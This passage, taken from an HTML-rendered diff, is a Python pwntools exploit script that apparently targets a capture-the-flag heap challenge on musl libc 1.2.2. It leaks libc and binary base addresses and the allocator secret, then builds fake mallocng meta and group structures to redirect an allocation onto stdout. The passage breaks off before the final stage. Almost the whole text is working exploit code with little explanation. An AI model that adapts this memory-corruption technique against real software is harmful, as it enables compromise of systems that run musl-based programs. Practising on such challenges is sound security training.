+</span></span><span class="line"><span class="cl"><span class="n">ir64</span>    <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-----------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> \
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    
+</span></span></span><span class="line"><span class="cl"><span class="s2">    c
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;r&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;host.docker.internal&#34;</span><span class="p">,</span><span class="mi">9999</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># p = process([&#34;/home/j4f/pwn/challs/heap/musl/musl-libc/v1.2.2&#34;,address])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># gdb.attach(p, gdbscript=gdbscript)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># pause()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">cho</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;option: &#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">namesz</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">notesz</span><span class="p">,</span> <span class="n">note</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cho</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;name size: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">namesz</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># sla(b&#34;name: &#34;, name)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;name: &#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;note size: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">notesz</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># sla(b&#34;note content: &#34;, note)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;note content: &#34;</span><span class="p">,</span> <span class="n">note</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find</span><span class="p">(</span><span class="n">namesz</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cho</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;name size: &#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">namesz</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># sla(&#34;name: &#34;,name)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="s2">&#34;name: &#34;</span><span class="p">,</span><span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delet</span><span class="p">(</span><span class="n">namesz</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cho</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;name size: &#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">namesz</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># sla(&#34;name: &#34;,name)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="s2">&#34;name: &#34;</span><span class="p">,</span><span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">remake</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cho</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## leak libcbase &amp;&amp; elfbase</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span> <span class="c1">#防止将整个group归还给堆管理器</span>
+</span></span><span class="line"><span class="cl"><span class="n">cho</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">find</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="s2">&#34;3&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="s2">&#34;3&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delet</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">find</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="s2">&#34;4&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="s2">&#34;4&#34;</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1">#一个堆块泄露elfbase，一个libc</span>
+</span></span><span class="line"><span class="cl"><span class="n">find</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;0x28:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libcbase</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">),</span><span class="mi">16</span><span class="p">),</span><span class="n">endianness</span><span class="o">=</span><span class="s2">&#34;big&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0xb7d60</span> <span class="c1">#这里不太对</span>
+</span></span><span class="line"><span class="cl"><span class="n">libcbase_true</span><span class="o">=</span><span class="n">libcbase</span> <span class="o">-</span> <span class="mh">0x2b020</span> <span class="o">+</span> <span class="mh">0x4000</span> <span class="c1">#调整了一下</span>
+</span></span><span class="line"><span class="cl"><span class="n">elfbase</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">),</span><span class="mi">16</span><span class="p">),</span><span class="n">endianness</span><span class="o">=</span><span class="s2">&#34;big&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x4c40</span>
+</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libcbase&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libcbase_true&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;elfbase&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># calculate important addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc_context</span> <span class="o">=</span> <span class="n">libcbase</span> <span class="o">+</span> <span class="mh">0xb4ac0</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># mmap_base = libcbase - 0xa000</span>
+</span></span><span class="line"><span class="cl"><span class="n">mmap_base</span> <span class="o">=</span> <span class="n">libcbase_true</span> <span class="o">-</span> <span class="mh">0x4000</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta_addr</span> <span class="o">=</span> <span class="n">mmap_base</span> <span class="o">+</span> <span class="mh">0x2010</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_mem_addr</span> <span class="o">=</span> <span class="n">mmap_base</span> <span class="o">+</span> <span class="mh">0x2040</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># stdout = libcbase + 0xb4280   </span>
+</span></span><span class="line"><span class="cl"><span class="n">stdout</span> <span class="o">=</span> <span class="n">libcbase_true</span> <span class="o">+</span> <span class="mh">0xdb2c0</span> 
+</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;malloc_context&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;mmap_base&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;fake_meta_addr&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;fake_mem_addr&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;stdout&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># leak secret</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">find</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pd</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">elfbase</span><span class="o">+</span><span class="mh">0x4fc0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">malloc_context</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x38</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">find</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="n">pd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">find</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;0x28:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">secret</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">),</span><span class="mi">16</span><span class="p">),</span><span class="n">endianness</span><span class="o">=</span><span class="s2">&#34;big&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;secret&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># set fake meta</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;5&#34;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">,</span><span class="mh">0x1200</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#0x1200:防止将mmap出来的group归还给堆管理器</span>
+</span></span><span class="line"><span class="cl"><span class="n">last_idx</span><span class="p">,</span> <span class="n">freeable</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="n">maplen</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#fake meta</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stdout</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">)</span>                  <span class="c1"># prev</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_meta_addr</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">)</span>         <span class="c1"># next</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_mem_addr</span><span class="p">)</span>                 <span class="c1"># mem</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                    <span class="c1"># avail_mask, freed_mask</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">((</span><span class="n">maplen</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">sc</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">freeable</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">|</span> <span class="n">last_idx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#对齐</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#fake group</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_mem</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_meta_addr</span><span class="p">)</span>                  <span class="c1"># meta</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_mem</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                    
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0xaa0</span> <span class="c1">#pad,为了页对齐，让secret在页起始位置</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#fake meta area</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">fake_meta</span> <span class="o">+</span> <span class="n">fake_mem</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">find</span><span class="p">(</span><span class="mh">0x1200</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#设置stdout-0x10为fake_group_addr</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># dequeue 2 set stdout_file - 0x10 (where the final fake group)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">   <span class="n">find</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pd</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">elfbase</span><span class="o">+</span><span class="mh">0x4fc0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">fake_mem_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x38</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;6&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="n">pd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delet</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span> <span class="c1">#dequeue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># queue 把fake_meta链入active[8]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># reset fake meta , free fake chunk 2 queue it(queue the fake meta)</span>
+</span></span><span class="line"><span class="cl"><span class="n">last_idx</span><span class="p">,</span> <span class="n">freeable</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="n">maplen</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">0</span> <span class="c1">#freeable置0是为了拒绝ok to free校验，防止释放meta</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                              <span class="c1"># prev</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                             <span class="c1"># next</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_mem_addr</span><span class="p">)</span>                 <span class="c1"># mem</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                    <span class="c1"># avail_mask, freed_mask</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">((</span><span class="n">maplen</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">sc</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">freeable</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">|</span> <span class="n">last_idx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_mem</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_meta_addr</span><span class="p">)</span>                  <span class="c1"># meta</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_mem</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;z&#39;</span> <span class="o">*</span> <span class="mh">0xa90</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">fake_meta</span> <span class="o">+</span> <span class="n">fake_mem</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#z()</span>
+</span></span><span class="line"><span class="cl"><span class="n">find</span><span class="p">(</span><span class="mh">0x1200</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">find</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x28</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pd</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">elfbase</span><span class="o">+</span><span class="mh">0x5fc0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">fake_mem_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x38</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;7&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="n">pd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delet</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;fake_meta_addr&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## reset fake meta&#39;s group at stdout_file -0x10</span>
+</span></span><span class="line"><span class="cl"><span class="n">last_idx</span><span class="p">,</span> <span class="n">freeable</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="n">maplen</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_meta_addr</span><span class="p">)</span>                 <span class="c1"># prev</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_meta_addr</span><span class="p">)</span>                <span class="c1"># next</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stdout</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>                 <span class="c1"># mem</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                    <span class="c1"># avail_mask, freed_mask</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">((</span><span class="n">maplen</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">sc</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">freeable</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">|</span> <span class="n">last_idx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x18</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_meta</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stdout</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;y&#39;</span> <span class="o">*</span> <span class="mh">0xa80</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">fake_meta</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">find</span><span class="p">(</span><span class="mh">0x1200</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
